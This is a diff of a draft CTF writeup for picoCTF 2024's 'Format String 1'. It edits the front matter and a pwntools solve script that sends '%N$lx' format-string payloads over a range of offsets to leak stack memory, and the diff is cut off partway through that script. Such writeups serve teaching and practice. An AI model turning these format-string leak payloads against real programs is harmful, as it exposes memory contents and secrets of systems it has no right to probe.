@@ -1,9 +1,9 @@
 ---
 title: "Format String 1 (picoCTF 2024)"
-summary: "Easy pwn chal - format string vuln"
-description: "Easy pwn chal - format string vuln"
+summary: "Easy pwn chal - Format String Vuln"
+description: "Easy pwn chal - Format String Vuln"
 tags: [pwn, easy, writeup]
-date: 2023-04-23T22:00:00-05:00
+date: 2024-04-07T22:00:00-05:00
 draft: true
 searchHidden: false
 ShowToc: true
@@ -22,7 +22,6 @@ Given files: [format-string-1](/picoctf-format-string-1/format-string-1) [format
 
 ## Writeup
 
-The first 
 
 
 ### Solve script
@@ -32,15 +31,14 @@ from pwn import *
 
 elf = ELF('./format-string-1')
 
-host = <'host'>
-port = <port>
-# p = remote(host, port)
+# host = 'host'
+# port = <port>
 
 s = ""
 orders = []
 for i in range (14,30):
-    p = remote(host, port)
-    # p = elf.process()
+    # p = remote(host, port)
+    p = elf.process()
     format_s = b"".join([b"%" + str(i).encode("utf-8") + b"$lx"])
     p.recvuntil(b":")
     p.sendline(format_s)
